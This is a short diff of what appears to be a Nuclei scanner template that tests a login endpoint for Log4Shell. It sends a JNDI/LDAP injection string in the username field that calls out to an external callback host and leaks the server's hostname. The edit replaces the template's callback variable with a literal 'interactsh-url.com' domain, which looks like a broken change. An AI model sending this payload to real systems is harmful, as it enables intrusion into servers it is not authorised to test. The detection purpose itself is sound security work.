@@ -38,7 +38,7 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/ui/
 
-        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com}","password":"admin"}
 
     matchers-condition: and
     matchers:
